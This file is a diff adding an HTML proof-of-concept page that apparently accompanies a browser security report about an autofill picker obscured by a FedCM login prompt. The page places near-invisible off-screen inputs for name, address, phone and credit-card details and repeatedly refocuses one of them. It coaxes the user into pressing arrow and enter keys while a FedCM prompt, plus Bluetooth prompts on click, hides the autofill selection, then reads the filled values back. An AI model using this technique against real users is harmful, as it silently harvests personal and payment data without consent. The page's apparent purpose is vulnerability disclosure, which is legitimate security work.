@@ -1,0 +1,142 @@
+
+<!doctype html>
+<html>
+<head>
+<body onclick="start()" value="Click here!" type="button" />
+<p id="output">(no output yet...)</p>
+
+<style>
+html { font-family: sans-serif; }
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+
+input { position: absolute; top: 0; left: -200px; opacity: 0.0001; }
+#inputElem { position: absolute; top: 30px; left: auto; left: 250px; }
+#inputElem.debug { opacity: 0.5; }
+
+#output { padding: 0.2em; background: #eee; }
+#output.success { background: lightgreen; }
+</style>
+</head>
+<body>
+<h1>PoC: Autofill obscured by FedCM prompt</h1>
+<p>Variations:</p>
+<ul>
+</ul>
+
+<!-- Group 1 -->
+<input id="groupOneElem" name="name" autocomplete="name">
+<input name="email" autocomplete="email">
+<input name="address-line1" autocomplete="address-line1">
+<input name="address-line2" autocomplete="address-line2">
+<input name="city" autocomplete="address-level2">
+<input name="state" autocomplete="address-level1">
+<input name="country-name" autocomplete="country-name">
+<input name="postal-code" autocomplete="postal-code">
+<input name="tel" autocomplete="tel">
+
+<!-- Group 2 -->
+<input id="groupTwoElem" name="cc-name" autocomplete="cc-name">
+<input name="cc-number" autocomplete="cc-number">
+<input name="cc-exp-month" autocomplete="cc-exp-month">
+<input name="cc-exp-year" autocomplete="cc-exp-year">
+
+<p id="instructions">Press down arrow key, then press enter</p>
+<script>
+
+function start(){
+
+
+navigator.bluetooth.requestDevice({acceptAllDevices:true});
+setTimeout("navigator.bluetooth.requestDevice({acceptAllDevices:true})", 20)
+}
+var searchParams = new URLSearchParams(window.location.search);
+var mode = searchParams.get('mode');
+var autofill = searchParams.get('autofill');
+var idpPort = searchParams.get('idpport');
+if (!idpPort) {
+    idpPort = 8088;
+}
+
+var inputElem;
+var debugMode = searchParams.get('debug') === '1';
+var setMainField = () => {
+  if (autofill == 'creditcard') {
+    var groupTwoElem = document.getElementById('groupTwoElem');
+    groupTwoElem.id = 'inputElem';
+    inputElem = groupTwoElem;
+  } else {
+    var groupOneElem = document.getElementById('groupOneElem');
+    groupOneElem.id = 'inputElem';
+    inputElem = groupOneElem;
+  }
+  if (debugMode) {
+    inputElem.classList.add('debug');
+  }
+}
+
+setMainField();
+
+var updateOutput = () => {
+    var inputs = document.querySelectorAll('input');
+    var inputValues = [];
+    inputs.forEach((elem) => {
+       if (elem.value.length) {
+         inputValues.push(elem.value);
+       }
+    });
+    output.innerText = inputValues.join(', ');
+    output.classList.add('success');
+    instructions.innerText = 'Thank you!';
+    abortController.abort();
+}
+
+inputElem.addEventListener('change', (e) => {
+  if (inputElem.value.length > 0) {
+    setTimeout(() => { updateOutput(); }, 10);
+  }
+});
+
+var ran = false;
+var abortController = new AbortController();
+
+var login = async () => {
+    var creds = await navigator.credentials.get({
+        signal: abortController.signal,
+        mediation: 'required',
+        identity: {
+            context: 'continue', // 'continue', 'signin', 'signup', 'use'
+            providers: [{
+                configURL: 'http://localhost:'+idpPort+'/config.json',
+                clientId: '123',
+                nonce: '456'
+            }]
+        }
+    });
+}
+
+if (mode == 'three') {
+    instructions.innerText = 'Press down arrow key twice, then press enter';
+} else {
+    instructions.innerText = 'Press down arrow key, then press enter';
+    setInterval(() => {
+        inputElem.focus();
+    }, 100);
+}
+
+window.addEventListener('keydown', () => {
+    if (ran) { return; }
+    ran = true;
+    if (mode == 'three') {
+	
+        setTimeout(() => {
+            // Show autofill prompt on delay to minimize time visible to user.
+            // However, autofill prompt should not be shown after FedCM prompt,
+            // otherwise autofill prompt will be above FedCM prompt.
+            inputElem.showPicker();
+        }, 140);
+    }
+    login();
+});
+</script>
+</body>
+</html>
